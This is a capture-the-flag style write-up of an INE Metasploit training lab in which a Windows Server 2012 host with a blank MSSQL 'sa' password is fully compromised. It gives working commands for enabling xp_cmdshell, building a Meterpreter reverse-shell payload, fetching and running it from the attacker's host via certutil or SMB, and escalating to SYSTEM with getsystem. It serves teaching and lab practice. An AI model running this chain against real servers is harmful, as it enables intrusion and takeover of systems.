---
title: "INE Metasploit CTF 1"
date: 2026-10-22
categories: [INE, Lab]
tags: [windows, mssql, sql server, empty password, xp_cmdshell, RCE, getsystem, seimpersonate, token impersonation, named pipe impersonation, privilege escalation, clr, nmap, metasploit, impacket, msfvenom, certutil, python]
image:
  path: /assets/img/INE/banner.webp
  lqip: "data:image/webp;base64,UklGRvYBAABXRUJQVlA4WAoAAAAQAAAAHwAACQAAQUxQSBsBAAABkGvb2rFX+3vf2LZt6/v/kcq2bds2S7W2U2WkykjLe7BtnxPnGiIiAQIK35cqQvA34aEE3wxAmeDLEvDK6Blb2LH2HEcTdRk+fDMAo8GCAK6O0TlBWlpqKtru1qrO4SlFVZkcbYCCEL9EqPvddw4/3VQD0LlLjjx5/9miBAKK0hQT3ffmseuF9xpQ0/fytZuU1NTEuIQE53ofUGi3REL1f8vUPibe42H5v3z5un/we0CGpyoT9uHcIEb9vWXylAiuvHPk3yuWXjd3dna2dzYNgXLDHgR4Qf1f88QhD5R2L0v+lW8cOLAclmW5ogAWnUivDtTfO+avGQKL3ff3wub3X1xQ4gvxVgKhKDNuAEChGBCtz3hGRnxHyoABAFZQOCC0AAAAEAQAnQEqIAAKAD7tYqpNqaWkIjAIATAdiWwAnS+PQAAckstmKzupqwQA/GAJj2rSsnYxXiIloZL4anV4YKPl3LHLvC5WLeJrDpnIPzMmd6LmX/pjUq/q5r1XGy4yigyPOyI1a1GJgQxa46PmT/1+xE/HXrwQ7OTEzbZr3K34pzTG4RCmid2FltrXI9eU4lqAE0H9ax/8f8/3/upMBKkfw2JGWEDjl+D/4/63ebP9L9oX4BAA"
  alt: INE Metasploit CTF 1 writeup
---

This is a practice lab from INE's *The Metasploit Framework* course — a single Windows Server 2012 target built around one of the most reliable Windows footholds there is: a **Microsoft SQL Server with a blank `sa` password**. Because the whole lab is about working *inside* Metasploit, this writeup leans into that workflow — the database-backed scan, the `sa` login, enabling `xp_cmdshell` for command execution, staging a Meterpreter payload, and finishing with `getsystem` to reach `NT AUTHORITY\SYSTEM`. A second, one-module path (`mssql_clr_payload`) does the same thing in a single `exploit` command.

| Field      | Details        |
|------------|----------------|
| Platform   | INE            |
| Difficulty | Lab            |
| OS         | Windows Server 2012 |
| IP         | 10.2.23.229    |
| Date       | October 2026   |

## Tools Used

| Tool                 | Description                                                         |
|----------------------|---------------------------------------------------------------------|
| Metasploit           | `db_nmap`, workspaces, `multi/handler`, and the `mssql_clr_payload` module |
| nmap                 | The `ms-sql-*` NSE scripts that found the empty `sa` password      |
| impacket-mssqlclient | Authenticated to MSSQL as `sa` and enabled `xp_cmdshell`           |
| msfvenom             | Generated the x64 Meterpreter reverse-shell executable             |
| Python               | `http.server` to serve the payload                                 |
| certutil             | Downloaded the payload onto the target (living-off-the-land)       |
| impacket-smbserver   | Alternative payload transfer over SMB                              |

## Reconnaissance & Enumeration

### Scanning from inside Metasploit

Since this is the Metasploit course, the scan runs through the framework's own database so results are stored and queryable. Starting PostgreSQL gives Metasploit its backend, then `db_nmap` runs a normal nmap whose output is parsed straight into that database:

```bash
service postgresql start
msfconsole
```

```bash
msf6 > db_nmap -p- -sCV 10.2.23.229 -oN nmap
msf6 > services
```

```bash
host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.2.23.229  135    tcp    msrpc         open   Microsoft Windows RPC
10.2.23.229  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.2.23.229  445    tcp    microsoft-ds  open   Windows Server 2008 R2 - 2012
10.2.23.229  1433   tcp    mssql         open   Microsoft SQL Server 2012 11.00.6020.00; SP3
10.2.23.229  3389   tcp    ms-wbt-server open   (RDP)
10.2.23.229  5985   tcp    http          open   WinRM
```

- **`db_nmap`** is nmap wrapped by Metasploit; its findings populate the database.
- **`services`** reads them back — every host, port and service the scan discovered, now available to any module.
- Two more commands set the engagement up: **`setg RHOSTS 10.2.23.229`** fixes the target globally so every module inherits it, and **`workspace -a target`** creates a named workspace to keep this host's data isolated.

```bash
msf6 > setg RHOSTS 10.2.23.229
msf6 > workspace -a target
```

The headline service is **Microsoft SQL Server 2012 on TCP 1433**. MSSQL is a classic Windows foothold, because its service account is privileged and it can be made to run OS commands.

### MSSQL enumeration — the blank `sa` password

nmap ships a whole family of `ms-sql-*` scripts. Pointing them at 1433 answers the only question that matters first — can we log in?

```bash
nmap -p1433 -sV --script "ms-sql*" 10.2.23.229
```

```bash
| ms-sql-empty-password:
|_    sa:<empty> => Login Success
| ms-sql-dump-hashes:
|     sa:0x020056f5245d8dd0f502737b7850ac73e66bac6bb6c...
| ms-sql-xp-cmdshell:
|_  (Use --script-args=ms-sql-xp-cmdshell.cmd='<CMD>' ...)
```

**`ms-sql-empty-password`** reports `sa:<empty> => Login Success` — the `sa` (system administrator) account has **no password at all**. `sa` is MSSQL's built-in superuser, so this is effectively full control of the database engine. The scripts also dump the MSSQL login hashes and confirm `xp_cmdshell` is reachable — the exact primitive that turns database admin into OS command execution.

## Initial Access — MSSQL `xp_cmdshell` as `mssqlserver`

### Logging in as `sa`

`impacket-mssqlclient` gives an interactive SQL prompt; with a blank password it connects straight in as `sa`:

```bash
impacket-mssqlclient sa@10.2.23.229
# (password: just press Enter)
SQL (sa  dbo@master)>
```

### Enabling `xp_cmdshell`

`xp_cmdshell` is an extended stored procedure that runs a Windows command from SQL — disabled by default. As `sa` we can switch it on, but it lives behind "advanced options", so two settings have to be flipped and committed with `RECONFIGURE`:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

With it enabled, a first command confirms the execution context:

```sql
EXEC xp_cmdshell 'whoami';
-- nt service\mssqlserver
```

Command execution as **`nt service\mssqlserver`** — the account the SQL Server service runs under. That is the foothold; the rest is turning this blind, one-command-at-a-time execution into a proper interactive shell.

### Staging a Meterpreter shell

`xp_cmdshell` runs one command and returns its text output — awkward to work in — so the goal is a real Meterpreter session. `msfvenom` builds an x64 reverse-shell executable pointed at our listener:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.49.7 LPORT=4444 -f exe -o reverse.exe
```

It then needs to land on the target. Two transfer methods, both driven through `xp_cmdshell` — worth knowing both because one is often blocked:

```bash
# Method A — HTTP with certutil (a signed Windows binary that doubles as a downloader)
python3 -m http.server       # on the attacker
```

```sql
EXEC xp_cmdshell 'mkdir C:\Temp';
EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.49.7:8000/reverse.exe C:\Temp\reverse.exe';
```

```bash
# Method B — SMB with an impacket share, then a plain copy
impacket-smbserver share $(pwd) -smb2support     # on the attacker
```

```sql
EXEC xp_cmdshell 'copy \\10.10.49.7\share\reverse.exe C:\Temp\reverse2.exe';
```

With the payload on disk and a `multi/handler` waiting (same payload, LHOST and LPORT), executing it fires the callback:

```sql
EXEC xp_cmdshell 'C:\Temp\reverse.exe';
```

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.49.7:4444
[*] Sending stage (201798 bytes) to 10.2.23.229
[*] Meterpreter session 4 opened (10.10.49.7:4444 -> 10.2.23.229:50082)

meterpreter > getuid
Server username: NT Service\MSSQLSERVER
```

## Privilege Escalation — `mssqlserver` → `SYSTEM`

### getsystem via SeImpersonatePrivilege

Service accounts like `mssqlserver` hold **`SeImpersonatePrivilege`** — the right to impersonate a client's token. That is the whole ballgame on Windows: a process that can impersonate can trick a `SYSTEM` service into handing over a `SYSTEM` token (the "Potato" family of techniques). Meterpreter's `getsystem` automates it:

```bash
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`SYSTEM` — the highest privilege on the host. The "Named Pipe Impersonation" technique it used is exactly the `SeImpersonate` abuse above.

### Collecting the flags

Dropping to a shell, the flags are scattered across the filesystem. One is even *named* for the lesson — `EscaltePrivilageToGetThisFlag.txt` sits in a `SYSTEM`-only location, readable only now that we have escalated:

```text
C:\> type flag1.txt                                              # REDACTED
C:\> dir C:\ /s /b | findstr -i flag
C:\Windows\System32\config\flag2.txt
C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
C:\> type C:\Windows\System32\config\flag2.txt                   # REDACTED
C:\> type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt   # REDACTED
C:\Users\Administrator\Desktop> type flag4.txt                   # REDACTED
```

## Alternative — One Module: `mssql_clr_payload`

Everything above can be collapsed into a single Metasploit module. `mssql_clr_payload` logs into MSSQL (here as `sa` with the blank password), loads a **CLR assembly** — .NET code MSSQL runs in-process — and executes a Meterpreter payload directly, no manual `xp_cmdshell` or file transfer:

```bash
msf6 > use exploit/windows/mssql/mssql_clr_payload
msf6 > set RHOST target.ine.local
msf6 > set payload windows/x64/meterpreter_reverse_tcp
msf6 > exploit
```

```bash
meterpreter > getuid
Server username: NT Service\MSSQLSERVER
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Same destination — `mssqlserver` then `getsystem` to `SYSTEM` — in one command. It's the automated counterpart to the manual chain, and doing the manual version first is what makes the module legible.

## Flags

| Flag        | Location                                                          | Value      |
|-------------|------------------------------------------------------------------|------------|
| `flag1.txt` | `C:\`                                                             | `REDACTED` |
| `flag2.txt` | `C:\Windows\System32\config\`                                     | `REDACTED` |
| `flag3.txt` | `C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt` | `REDACTED` |
| `flag4.txt` | Administrator Desktop                                            | `REDACTED` |

## Key Takeaways

- **A blank `sa` password is an instant Windows foothold.** MSSQL's `sa` is a superuser, and the `ms-sql-empty-password` NSE script answered the whole access question in one line. Any exposed SQL Server deserves a credential check before anything heavier.
- **Database admin becomes OS command execution through `xp_cmdshell`.** It's disabled by default, but `sa` can flip it on with two `sp_configure` + `RECONFIGURE` statements. Treat SQL superuser access as equivalent to a shell on the host — because it is.
- **Know two ways to land a payload.** `certutil` over HTTP and an `impacket-smbserver` copy over SMB both deliver the executable through the same `xp_cmdshell` primitive; when egress or a protocol is filtered, having the alternative is what keeps the chain moving.
- **Service accounts almost always own `SeImpersonatePrivilege`.** Landing as `mssqlserver` isn't `SYSTEM`, but that privilege makes `getsystem` (Named-Pipe / Potato impersonation) a formality. On any Windows service foothold, check `getprivs` for `SeImpersonate` first.
- **Learn the manual chain, then appreciate the one-liner.** `mssql_clr_payload` compresses login → CLR load → payload into a single `exploit`, but understanding each manual step — the `sa` login, enabling `xp_cmdshell`, the staged transfer, `getsystem` — is what lets you adapt when the single module doesn't fit.
